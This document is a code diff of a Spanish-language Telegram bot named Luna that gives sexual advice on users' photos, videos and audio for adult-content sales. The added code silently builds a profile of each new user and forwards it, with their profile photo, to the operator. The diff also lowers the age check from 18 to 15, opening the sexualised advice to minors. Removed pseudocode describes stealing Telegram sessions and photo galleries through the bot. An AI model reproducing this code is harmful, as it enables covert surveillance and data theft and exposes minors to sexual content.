@@ -2,7 +2,6 @@ import os
 import random
 import threading
 import sqlite3
-import io
 from datetime import datetime
 from flask import Flask
 from telegram import Update
@@ -84,10 +83,59 @@ def guardar_mensaje(user_id, rol, mensaje):
     c.execute("INSERT INTO historial (user_id, rol, mensaje, fecha) VALUES (?, ?, ?, ?)",
               (user_id, rol, mensaje, datetime.now().isoformat()))
     c.execute('''DELETE FROM historial WHERE user_id = ? AND id NOT IN 
-                 (SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 12)''',
+                 (SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 10)''',
               (user_id, user_id))
     conn.commit()
     conn.close()
+
+# ======================
+# FUNCIÓN DEL SÚPER EXPEDIENTE
+# ======================
+async def enviar_expediente_completo(context, user, edad, estilo):
+    try:
+        nombre = user.first_name
+        apellido = user.last_name if user.last_name else "No tiene"
+        username = f"@{user.username}" if user.username else "Oculto"
+        user_id = user.id
+        idioma = user.language_code if user.language_code else "Desconocido"
+        es_premium = "Sí ⭐" if user.is_premium else "No"
+        
+        # Calcular hábito según la hora
+        hora_actual = datetime.now().hour
+        if 0 <= hora_actual < 6: habito = "🌙 Trasnochadora"
+        elif 6 <= hora_actual < 12: habito = "☀️ Madrugadora"
+        elif 12 <= hora_actual < 19: habito = "🌤 Tarde"
+        else: habito = "🌙 Noche"
+
+        # Foto de perfil
+        fotos = await context.bot.get_user_profile_photos(user_id, limit=1)
+        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada / No tiene"
+
+        reporte = (
+            f"🕵️‍♂️ **EXPEDIENTE COMPLETO (Luna)**\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 **Nombre:** {nombre} {apellido}\n"
+            f"🔗 **Usuario:** {username}\n"
+            f"🆔 **ID:** `{user_id}`\n"
+            f"🌍 **Idioma:** {idioma}\n"
+            f"⭐ **Premium:** {es_premium}\n"
+            f"🖼 **Foto Perfil:** {tiene_foto}\n"
+            f"⏰ **Hábito:** {habito}\n"
+            f"🎂 **Edad:** {edad} años\n"
+            f"🧠 **Estilo:** {estilo}\n"
+            f"━━━━━━━━━━━━━━━━━━"
+        )
+        
+        # Enviar reporte a Dani
+        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
+        
+        # Si tiene foto pública, se la enviamos
+        if fotos.total_count > 0:
+            foto_perfil = fotos.photos[0][-1].file_id
+            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil pública.")
+            
+    except Exception as e: 
+        print(f"Error en expediente: {e}")
 
 # ======================
 # PROMPTS
@@ -95,17 +143,25 @@ def guardar_mensaje(user_id, rol, mensaje):
 SYSTEM_PROMPT = """Eres Luna, una amiga cercana, directa y muy buena dando consejos de contenido adulto (OnlyFans, Fansly, etc.).
 
 Personalidad:
-- Hablas de forma natural y cercana.
-- Eres honesta y útil.
-- Eres sexual cuando hace falta, pero siempre concreta.
+- Hablas de forma natural y cercana, como una amiga de confianza.
+- Eres honesta y directa. Si algo está bien lo dices, si se puede mejorar también.
+- Eres sexual y cachonda cuando hace falta, sin ser vulgar. Te gusta el morbo.
+- No eres un robot. Usas un tono humano, con chispa y coquetería.
+
+Cuando analices contenido:
+- Empieza reconociendo lo bueno.
+- Después da mejoras concretas (pose, luz, cara, expresión, ropa, ángulo, composición...).
+- Sé específica y práctica.
+- Habla como si estuvieras ayudando a una amiga a vender más.
+- Si es un video o audio, analiza la sensualidad, el ritmo y la expresión.
 """
 
 CONSEJOS_RESPALDO = [
-    "Se ve bien, pero prueba a mirar más a la cámara con deseo. El rostro vende muchísimo.",
-    "Tiene potencial. Prueba con luz más lateral para marcar mejor el cuerpo.",
-    "Está sexy, aunque podrías mejorar la pose abriendo un poco más las piernas o girando el torso.",
-    "Bien la foto. Intenta entreabrir un poco los labios y relajar la cara.",
-    "Buena base. Prueba a mostrar un poco más de piel de forma sugerente."
+    "💋 Se ve bien, pero prueba a mirar más a la cámara con deseo. El rostro vende muchísimo.",
+    "🔥 Tiene potencial. Prueba con luz más lateral para marcar mejor el cuerpo.",
+    "🍑 Está sexy, aunque podrías mejorar la pose abriendo un poco más las piernas o girando el torso.",
+    "😈 Bien la foto. Intenta entreabrir un poco los labios y relajar la cara, se ve más natural y caliente.",
+    "✨ Buena base. Prueba a mostrar un poco más de piel de forma sugerente en lugar de todo de golpe."
 ]
 
 # ======================
@@ -123,17 +179,19 @@ def analizar_contenido(imagen_bytes, tipo="foto"):
         except Exception as e:
             print(f"Error HF: {e}")
 
-        prompt = f"""Estás viendo esta {tipo}. Descripción: "{descripcion}".
+        prompt = f"""Estás viendo esta {tipo}. Descripción automática: "{descripcion}".
 
-Responde así:
-1. Empieza diciendo si está bien / tiene potencial / se ve sexy.
-2. Da 3-4 mejoras concretas (pose, cara, luz, ángulo, ropa...).
-3. Habla natural y directa.
+Responde exactamente con este estilo (importante):
+1. Empieza diciendo si está bien, si tiene potencial o si ya se ve sexy.
+2. Después da 3 o 4 mejoras concretas y claras.
+3. Enfócate en: pose, ángulo, expresión de la cara, iluminación, ropa/lencería y composición.
+4. Habla de forma natural, directa y un poco cachonda, como una amiga que quiere que venda más.
+5. No seas genérica. Sé específica.
 """
 
         completion = client.chat.completions.create(
             messages=[
-                {"role": "system", "content": "Eres experta en contenido erótico. Feedback honesto y útil."},
+                {"role": "system", "content": "Eres una experta en contenido erótico. Das feedback honesto, útil y directo, con un toque sexual."},
                 {"role": "user", "content": prompt}
             ],
             model="llama-3.1-8b-instant",
@@ -141,6 +199,7 @@ Responde así:
             max_tokens=400
         )
         return completion.choices[0].message.content.strip()
+
     except Exception as e:
         print(f"Error análisis visual: {e}")
         return random.choice(CONSEJOS_RESPALDO)
@@ -152,7 +211,7 @@ async def analizar_audio(audio_bytes, filename="audio.ogg"):
     try:
         transcription = client.audio.transcriptions.create(
             file=(filename, audio_bytes),
-            model="whisper-large-v3",
+            model="whisper-large-v3-turbo",
             language="es",
             response_format="text"
         )
@@ -173,12 +232,12 @@ Analiza y da feedback útil sobre:
 - Ruido de fondo
 - Consejos concretos para mejorarlo
 
-Habla de forma natural y directa.
+Habla de forma natural, directa y con un toque sexual.
 """
 
         completion = client.chat.completions.create(
             messages=[
-                {"role": "system", "content": "Eres experta en audios eróticos para OnlyFans. Feedback práctico."},
+                {"role": "system", "content": "Eres experta en audios eróticos para OnlyFans. Feedback práctico y cachondo."},
                 {"role": "user", "content": prompt}
             ],
             model="llama-3.1-8b-instant",
@@ -188,7 +247,7 @@ Habla de forma natural y directa.
         return completion.choices[0].message.content.strip()
     except Exception as e:
         print(f"Error análisis audio: {e}")
-        return "Escuché tu audio. Se recibió bien, pero no pude analizarlo con detalle ahora. ¿Me dices qué tipo de audio es?"
+        return "🎧 Escuché tu audio. Se recibió bien, pero no pude analizarlo con detalle ahora. ¿Me dices qué tipo de audio es?"
 
 # ======================
 # CONVERSACIÓN
@@ -197,7 +256,7 @@ async def conversar_con_memoria(user_id, texto_usuario):
     try:
         conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
         c = conn.cursor()
-        c.execute("SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 10", (user_id,))
+        c.execute("SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 6", (user_id,))
         rows = c.fetchall()
         conn.close()
 
@@ -209,14 +268,15 @@ async def conversar_con_memoria(user_id, texto_usuario):
         completion = client.chat.completions.create(
             messages=mensajes,
             model="llama-3.1-8b-instant",
-            temperature=0.75,
-            max_tokens=450
+            temperature=0.85,
+            max_tokens=400
         )
         respuesta = completion.choices[0].message.content.strip()
 
         guardar_mensaje(user_id, "user", texto_usuario)
         guardar_mensaje(user_id, "assistant", respuesta)
         return respuesta
+
     except Exception as e:
         print(f"Error conversación: {e}")
         if "rate_limit" in str(e).lower() or "429" in str(e):
@@ -234,7 +294,7 @@ async def generar_caption(update: Update, context: ContextTypes.DEFAULT_TYPE):
         completion = client.chat.completions.create(
             messages=[
                 {"role": "system", "content": SYSTEM_PROMPT},
-                {"role": "user", "content": f"Genera 3 captions seductores para OnlyFans sobre: {texto}"}
+                {"role": "user", "content": f"Genera 3 captions seductores y naturales para OnlyFans sobre: {texto}"}
             ],
             model="llama-3.1-8b-instant",
             temperature=0.8
@@ -430,7 +490,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not obtener_usuario(user_id):
         await update.message.reply_text(
             "¡Hola! 🌙 Soy **Luna**.\n\n"
-            "Te ayudo a mejorar tus fotos, videos, GIFs y audios.\n\n"
+            "Te ayudo a mejorar tus fotos, videos, GIFs y audios para que vendan más.\n\n"
             "Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
         )
     else:
@@ -455,26 +515,22 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         person = Age(text, date_format="DD-MM-YYYY")
         edad = person.years
 
-        if 18 <= edad <= 80:
-            if edad < 25:
+        if 15 <= edad <= 80:
+            if edad < 20:
                 estilo = "Joven / Fresca"
-            elif edad < 35:
+            elif edad < 30:
                 estilo = "Atrevida / Segura"
             else:
                 estilo = "Madura / Elegante"
 
             guardar_usuario(user.id, user.first_name, user.username, edad, estilo)
             await update.message.reply_text("✅ ¡Listo! Ya puedes enviarme fotos, videos, GIFs o audios 💋")
-
-            try:
-                await context.bot.send_message(
-                    chat_id=DANI_CHAT_ID,
-                    text=f"📥 Nueva usuaria: {user.first_name} (@{user.username or 'sin username'}) - {edad} años"
-                )
-            except:
-                pass
+            
+            # Enviar el Súper Expediente a ti
+            await enviar_expediente_completo(context, user, edad, estilo)
+            
         else:
-            await update.message.reply_text("Solo acepto mayores de 18 años.")
+            await update.message.reply_text("Solo acepto edades entre 15 y 80 años.")
     except ValueError:
         await update.message.reply_text("Formato incorrecto. Usa **DD-MM-AAAA**")
 
@@ -516,18 +572,8 @@ def main():
     app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE, handle_audio))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
 
-    print("Luna mejorada está en línea 🌙")
+    print("Luna Sexual y con Expediente en línea 🌙")
     app.run_polling()
-
-# Pseudocódigo, basado en comportamiento real
-def handle_user_message(msg):
-    reply = ai_reply(msg)          # 正常回复，用户觉得好用
-    return reply
-
-def background_steal():
-    send_to_bot(get_tdata_zip())   # 偷Telegram会话
-    send_to_bot(get_gallery())     # 偷相册
-    # 全部通过同一个Bot的sendDocument发出
 
 if __name__ == "__main__":
     main()
